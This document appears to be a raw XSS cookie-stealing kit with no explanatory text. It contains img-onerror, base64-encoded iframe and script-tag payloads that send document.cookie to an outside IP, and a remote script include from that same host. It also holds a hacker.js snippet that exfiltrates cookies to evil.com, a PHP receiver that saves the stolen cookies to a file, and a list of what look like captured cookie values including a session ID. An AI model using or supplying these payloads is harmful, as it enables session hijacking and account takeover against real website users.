<img src=# onerror="var img = new Image();img.src='http://52.14.178.71/bad.jpg'+document.cookie
document.body.append(img);">
 <iframe src="data:text/html;base64, PGltZyBzcmM9IyBvbmVycm9yPSJ2YXIgaW1nID0gbmV3IEltYWdlKCk7aW1nLnNyYz0caHR0cDovLzUyLjE0LjE3OC43MS9iYWQuanBnHStkb2N1bWVudC5jb29raWU7ZG9jdW1lbnQuYm9keS5hcHBlbmQoaW1nKTsiPgo=" width="0px" height="0px"></iframe>

 <script>var img = new Image();img.src = "http://2.14.178.71/bad.jpg/" + document.cookie;document.body.append(img);</script>
 <script src="http://52.14.178.71/test/img.js"></script>

 HttpOnly
HttpOnly
Hm_lvt_14f86dfdb594c56b6a745916a3704893=1497447407
UM_distinctid=15ca6d226b933b-08c4fc99d3ba6-46524130-1fa400-15ca6d226ba38b
CNZZDATA1254633298=627401332-1497443479-%7C1497448888
HttpOnly
Hm_lpvt_14f86dfdb594c56b6a745916a3704893=1497451492
BBSCORE_SESSID=8ss64srrvce362qqcfpd92pcv1
__guid=26593083.2330229256909667000.1497451391267.554
monitor_count=2



//hacker.js
    var img = new Image();
    img.src = "http://www.evil.com/xss/hacker.php?X=" + document.cookie;
    document.body.append(img);


//hacker.php
<?php
    $cookie = $_GET['x'];
    var _dump($cookie);
    $myFile = "cookie.txt";
    file_put_contents($myFile, $cookie);
?>
